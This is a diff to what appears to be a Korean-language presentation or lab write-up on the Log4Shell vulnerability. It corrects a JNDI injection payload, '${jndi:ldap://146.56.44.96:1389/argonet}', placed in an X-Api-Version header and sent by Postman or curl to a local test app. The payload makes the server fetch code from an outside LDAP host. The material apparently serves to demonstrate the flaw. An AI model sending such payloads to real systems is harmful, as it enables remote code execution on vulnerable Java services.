@@ -55,13 +55,13 @@ Header Value: ${jndi:java:version}
 ```zsh
 GET: localhost:9999
 Header Key: X-Api-Version
-Header Value: ${jndi:146.56.44.96:1389/argonet}
+Header Value: ${jndi:ldap://146.56.44.96:1389/argonet}
 ```
 
 > Postman 사용불가능할 경우 Terminal에서 curl로 요청
 >
 > ```zsh
-> curl 127.0.0.1:9999 -H 'X-Api-Version: ${jndi:146.56.44.96:1389/argonet}'
+> curl 127.0.0.1:9999 -H 'X-Api-Version: ${jndi:ldap://146.56.44.96:1389/argonet}'
 > ```
 
 ![5](/Users/shane/Documents/Github/mdblog/presentation/log4shell.assets/5.png)
